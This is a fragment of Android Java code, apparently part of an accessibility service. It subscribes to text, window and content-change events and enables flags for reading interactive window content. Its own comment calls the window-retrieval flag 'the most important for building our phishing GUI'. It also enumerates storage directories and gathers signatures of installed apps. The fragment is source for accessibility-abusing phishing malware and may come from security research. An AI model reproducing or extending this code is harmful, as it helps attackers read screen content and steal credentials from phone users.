                | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED | AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOWS_CHANGED ;


        /* Register the accessibility service for the feedbacks - what type of feedback this service can provide */
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK | AccessibilityServiceInfo.FEEDBACK_GENERIC |
                AccessibilityServiceInfo.FEEDBACK_AUDIBLE | AccessibilityServiceInfo.FEEDBACK_BRAILLE | AccessibilityServiceInfo.FEEDBACK_GENERIC | AccessibilityServiceInfo.FEEDBACK_HAPTIC | AccessibilityServiceInfo.FEEDBACK_SPOKEN | AccessibilityServiceInfo.FEEDBACK_VISUAL;

        /* FLAG_RETRIEVE_INTERACTIVE_WINDOWS - this flag for the accessibility service is the most important for building our phishing GUI
         * This flag enables to retrieve the GUI elements content */
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS|AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;



        this.setServiceInfo(info);
        /* Fetch all the phone related directory structure - can be used later */
        System.out.println("getRootDirectory"+ Environment.getRootDirectory().toString());

        System.out.println("getExternalStorageState"+ Environment.getExternalStorageState().toString());

        System.out.println("getExternalStorageDirectory"+ Environment.getExternalStorageDirectory().toString());

        System.out.println("getDataDirectory"+ Environment.getDataDirectory().toString());

        contextWrapper = new ContextWrapper(this.getApplicationContext());
        directory = contextWrapper.getDir(filepath, Context.MODE_PRIVATE);
        System.out.println("Directory for storing file data: "+directory.getAbsolutePath());

        System.out.println("*****************calling the hash code function********************");

        /* For the first time when the service is started - fetch the certificates and signature all the apps
         * installed on the smartphone. */
        GetHashCodeforOpenedApp();

    }

}
